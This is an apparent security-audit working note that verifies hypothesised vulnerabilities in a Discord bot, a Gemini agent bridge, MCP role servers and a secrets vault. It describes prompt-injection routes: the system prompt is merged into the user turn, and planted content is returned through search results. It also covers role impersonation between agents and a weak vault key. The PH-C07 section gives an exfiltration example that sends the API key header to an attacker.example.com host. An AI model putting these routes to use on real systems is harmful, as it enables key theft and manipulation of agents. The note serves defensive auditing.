# Round 3 Hypotheses — causal-verifier-02

Reasoning model: Causal / Counterfactual
Source: code-anatomy.md + round-1-hypotheses.md + round-2-hypotheses.md + cross-model-seeds.md
Task: Confirm/deny causal chains; test counterfactuals; identify which protections would actually break the attack chain if added.

---

## PH-C01: Causal Verification — CROSS-01 (Prompt Injection + No systemInstruction)

**Causal question**: Does the absence of Gemini's `systemInstruction` field causally enable prompt injection, or would the injection succeed even with `systemInstruction`?

**Code examination**:
- `agent-bridge.js:116`: `genAI.getGenerativeModel({ model: geminiModel })` — NO `systemInstruction` field
- `agent-bridge.js:119-122`: `model.generateContent({ contents: [{ role: 'user', parts: [{ text: systemPrompt + '\n\n---\n\n' + contextBlock + '\n\n---\n\n**User question:** ' + question }] }] })`
- The `---` separators are markdown horizontal rules — they have no semantic significance to the model as delimiter tokens. They do NOT prevent injection.

**Counterfactual test**: If `getGenerativeModel({ model: geminiModel, systemInstruction: systemPromptText })` were used, and `contents` contained ONLY the user question (not the system prompt), the model would have structural separation. The system instruction is given to the model at a lower-level context that user turns cannot directly override.

**Causal verdict**: CONFIRMED. The absence of `systemInstruction` is causally necessary for reliable, low-effort injection. Without it, the attacker's injected text must compete against earlier text in the same message with no privilege differential. With `systemInstruction`, the attacker's user-turn text would need to fight against model-level instructions — still possible with sophisticated jailbreaks, but significantly harder.

**Verification finding**:
- `agent-bridge.js:116` — `getGenerativeModel({ model: geminiModel })` — confirmed: no `systemInstruction`
- Severity: HIGH (causal link confirmed)
- Status: VALIDATED (CROSS-01 combined hypothesis holds)

---

## PH-C02: Causal Verification — CROSS-02 (Second-Order Injection via Search Results)

**Causal question**: Does the FastAPI semantic search actually return plan body content in the search results, or does it return only metadata?

**Code examination** (agent-bridge.js):
- `semanticSearch()` at line 65: calls `fetchJSON('/api/search?q=...&limit=5')`
- Line 70: `${(r.body || '').slice(0, 200)}` — result.body is expected and used. The `body` field from search results is sliced at 200 chars and inserted into the prompt.

**Critical finding**: The `getPlans()` function at agent-bridge.js:39-41 only returns `p.title` (the plan title), NOT the full plan content. So direct injection via plan title is limited to 100-200 chars max. HOWEVER, `semanticSearch()` returns `r.body` (up to 200 chars) from the search results. If the FastAPI search endpoint returns war-room message bodies or document chunks that include attacker-planted content (from `POST /api/plans/create` creating a document that gets indexed in the vector store), then second-order injection via search results IS viable.

**Counterfactual test**: If `semanticSearch()` returned only result IDs and scores (no body content), the prompt injection via planted content would be blocked at this path. The `r.body.slice(0, 200)` is the critical sink.

**Causal verdict**: VALIDATED with condition. The attack requires that FastAPI's `/api/search` endpoint returns body/content from the vector store, and that attacker-planted plans via `POST /api/plans/create` are indexed in the same vector store that `/api/search` queries. Based on the KB's description of the search endpoint (IN-7: `GET /api/search?q=` and KB mention of "zvec" vector store indexing), this is likely. The unauthenticated plan creation is confirmed to index content in the vector store (KB: "index in zvec").

**Verification finding**:
- `agent-bridge.js:70` — `${(r.body || '').slice(0, 200)}` — confirmed: body content injected into prompt
- `dashboard/routes/plans.py:461` — unauthenticated `POST /api/plans/create` — confirmed: plan content written and indexed
- Status: VALIDATED

---

## PH-C03: Causal Verification — CROSS-03 (Hardcoded Vault Key + World-Readable File)

**Causal question**: Is the vault file actually created without restrictive permissions? Does the process umask protect it?

**Code examination** (vault.py):
- `_save_data()` at line 136-145: `with open(self.path, "wb") as f:` — standard open, no `os.chmod()`, no `os.umask()` modification
- `path.parent.mkdir(parents=True, exist_ok=True)` at line 137 — directory created with default permissions

**Counterfactual test**: If `_save_data()` called `os.chmod(self.path, 0o600)` after writing, local user access would be blocked. If the directory were created with `mode=0o700`, subdirectory traversal would also be blocked.

**Additional finding**: Key derivation at `vault.py:111` — `env_key.encode().ljust(32)[:32]` — null-byte padding confirmed. The `.ljust(32)` Python method pads with space characters (`\x20`) by default when called without a second argument... wait — Python's `str.ljust(width, fillchar=' ')` defaults to SPACE, not null bytes. But `bytes.ljust(32)` (if called on a bytes object) pads with `\x00`. Let's be precise:

```python
env_key.encode()          # returns bytes, e.g. b"short"
.ljust(32)                # bytes.ljust pads with b'\x00' (null byte) — THIS IS CORRECT
[:32]                     # truncate to 32
```

`bytes.ljust(width[, fillbyte])` — default fillbyte IS `b'\x00'`. So the null-byte padding analysis in PH-09/PH-16 is CORRECT — short keys ARE padded with null bytes, not spaces.

**Causal verdict**: CONFIRMED. Both the world-readable file (no chmod) and the known/weak key (hardcoded or null-padded) are confirmed. Their causal combination is straightforward: world-readability enables file copy; known key enables decryption.

**Verification finding**:
- `vault.py:141-142` — no `os.chmod()` call — confirmed
- `vault.py:111` — `bytes.ljust(32)` pads with `\x00` — confirmed
- `vault.py:117` — hardcoded key literal — confirmed
- Status: VALIDATED (CROSS-03 holds in full)

---

## PH-C04: Causal Verification — CROSS-04 (Role Impersonation Dual Vector)

**Causal question**: Do downstream agents actually trust the `from_role` field in channel messages and the `author_role` in memory entries? Is there any secondary verification?

**Code examination**:
- `channel-server.py:post_message()`: `from_role` written to `"from"` field in JSONL
- `channel-server.py:read_messages()`: returns messages with `from_role` values as-is; no re-validation on read
- `memory-server.py:publish()`: `author_role` written directly to memory entry
- `memory-core.py:query()`: filters by `author_role` if specified, but does not validate that stored `author_role` values are legitimate

**Critical observation**: The MCP SDK runs over stdio. The MCP server has no way to authenticate which process is calling it — all calls arrive as JSON-RPC over the same stdio pipe. Any process with access to the MCP server's stdin/stdout can issue any tool call with any role claim. This is an inherent property of the stdio transport, not a code-level oversight.

**Counterfactual test**: If `post_message()` validated `from_role in VALID_ROLES` (the constant exists but is unused), a caller would need to use a valid role name — but could still use any valid role (including "manager"). True role authentication would require cryptographic signatures on messages, not just string validation. Adding the VALID_ROLES check would block INVALID role names but NOT legitimate role names used by imposters.

**Causal verdict**: CONFIRMED with nuance. The VALID_ROLES dead-code gap (PH-07/PH-15) IS a genuine finding — adding the check would prevent nonsense role names but not manager impersonation by a compromised legitimate agent process. The causal chain for cross-agent manipulation is confirmed.

**Verification finding**:
- `channel-server.py:38` — VALID_ROLES defined but unused — confirmed
- `channel-server.py:71-76` — only msg_type validated, from_role not — confirmed
- Status: VALIDATED

---

## PH-C05: New Causal Finding — Promise.all() Context Fetch Before GOOGLE_API_KEY Check

**Causal question**: The code at agent-bridge.js:82-84 checks `GOOGLE_API_KEY` before proceeding. Does this check prevent context gathering, or does it occur after?

**Code examination** (agent-bridge.js):
```javascript
async function askAgent(question) {
  if (!GOOGLE_API_KEY) {                    // line 82 — CHECK FIRST
    return '❌ `GOOGLE_API_KEY` ...';        // line 83 — EARLY RETURN
  }

  const [plans, rooms, stats, search] = await Promise.all([  // line 87 — FETCH AFTER CHECK
    getPlans(), getRooms(), getStats(), semanticSearch(question),
  ]);
```

The check is BEFORE the fetch. No context leak via missing API key.

**However, new finding**: `semanticSearch()` (line 65) calls `fetchJSON('/api/search?q=...')` which hits the FastAPI search endpoint. The FastAPI `/api/search` endpoint is **unauthenticated** (IN-7 in attack surface map). The bot makes this request with `X-API-Key` header. If the API key is empty (default `OSTWIN_API_KEY = process.env.OSTWIN_API_KEY || ''`), the bot makes UNAUTHENTICATED search requests that still return data. This means the API key is not required for context gathering to work — the bot can exfiltrate plan data even if OSTWIN_API_KEY is not set.

**Causal verdict**: NEW VALIDATED FINDING. Context gathering works even with empty/missing OSTWIN_API_KEY because the downstream FastAPI endpoints are unauthenticated. The GOOGLE_API_KEY guard only blocks the Gemini call; it does not block the four context-gathering API calls.

Wait — re-reading: the `if (!GOOGLE_API_KEY) return` at line 82 returns BEFORE the Promise.all at line 87. So if GOOGLE_API_KEY is missing, context is NOT fetched. The guard works as intended for the "no API key" case.

**Revised finding**: The guard IS effective for the GOOGLE_API_KEY case. But note: ANY valid guild member who can @mention the bot (when GOOGLE_API_KEY IS set) triggers 4 API calls to FastAPI for free. No per-user throttling exists.

**Status**: PH-19 (no rate limiting) CONFIRMED as a separate finding.

---

## PH-C06: Causal Verification — Vault Plaintext on Missing cryptography Package

**Causal question**: Is `CRYPTOGRAPHY_AVAILABLE = False` a realistic scenario in production deployments?

**Code examination** (vault.py:9-16):
```python
try:
    from cryptography.fernet import Fernet
    ...
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False
```

**Assessment**: `cryptography` is a common Python package but is not guaranteed to be present in all environments. In minimal Docker images, CI runners, or dev environments without a full `requirements.txt` install, `cryptography` could be absent. The `requirements.txt` for `.agents/` would need to be checked.

**Verification needed**: Check if `cryptography` is in `.agents/` or root `requirements.txt`. If it IS listed as a requirement, PH-05 is a lower-probability scenario but still valid for misconfigured deployments.

**Status**: NEEDS-DEEPER — check requirements files to assess real-world probability

---

## PH-C07: New Causal Finding — DASHBOARD_URL Fragment Injection (URL Construction Flaw)

**Causal question**: Beyond full host replacement, can `DASHBOARD_URL` contain a URL fragment `#` that causes API path to be ignored?

**Code examination** (agent-bridge.js:21):
```javascript
const res = await fetch(`${DASHBOARD_URL}${path}`, { headers });
```

If `DASHBOARD_URL = 'http://attacker.example.com/capture#'`, then:
- `fetch('http://attacker.example.com/capture#/api/plans', { headers })`
- The fragment `#/api/plans` is NOT sent to the server; the server receives only `GET /capture`
- The `X-API-Key` header IS sent to `attacker.example.com`

This fragment-injection variant means the attacker doesn't even need the API paths to match — they just need the HTTP request with the API key header to reach their server.

**Causal verdict**: VALIDATED. Fragment injection via DASHBOARD_URL is a confirmed exfiltration path that requires no URL path matching on the attacker's server. Confirmed the same code path as PH-03, with an additional exploitation variant.

**Status**: VALIDATED (extends PH-03)

---

## PH-C08: New Causal Finding — Message Logging JSONL Contains Full Content Including Injection Payloads

**Causal question**: Are injected payloads persisted to disk, creating a persistent artifact that could be re-read by later processes?

**Code examination** (client.js:97-99):
```javascript
const logFile = path.join(LOGS_DIR, `${entry.channelName}-${entry.channelId}.jsonl`);
fsp.appendFile(logFile, JSON.stringify(entry) + EOL)
```

- `entry.content = message.content` (full, unmodified Discord message content including injection payloads)
- Written to disk at `discord-bot/logs/{channelName}-{channelId}.jsonl`

**Finding**: ALL prompt injection payloads sent to the bot are persistently logged to disk in JSONL format. If any future process reads and processes these logs (e.g., for analytics, replay, or log-based context loading), the stored injection payloads could be re-triggered. Additionally, these logs may be readable by other processes on the system.

**Causal verdict**: VALIDATED. Log files containing adversarial payloads exist on disk. The immediate security concern is information disclosure (logs contain full message content from all channel users). Secondary concern is stored injection if logs are ever processed.

**Status**: VALIDATED (new finding — log-based information disclosure + stored injection)

---

## Round 3 Summary

| ID | Title | Causal Status | Severity |
|---|---|---|---|
| PH-C01 | No systemInstruction causally enables reliable injection | CONFIRMED | HIGH |
| PH-C02 | Search result body content is the second-order injection sink | VALIDATED (conditioned on FastAPI search returning body) | HIGH |
| PH-C03 | Vault: no chmod + known key = trivial secret exposure | CONFIRMED | HIGH |
| PH-C04 | Role impersonation: dead VALID_ROLES check + no MCP auth | CONFIRMED | MEDIUM-HIGH |
| PH-C05 | No rate limiting: all guild members can exhaust API quota | CONFIRMED | MEDIUM |
| PH-C06 | Plaintext vault fallback: realistic only if cryptography absent | NEEDS-DEEPER | HIGH (if triggered) |
| PH-C07 | DASHBOARD_URL fragment injection variant | VALIDATED | HIGH |
| PH-C08 | Log files persist injection payloads + full message content | VALIDATED | MEDIUM |
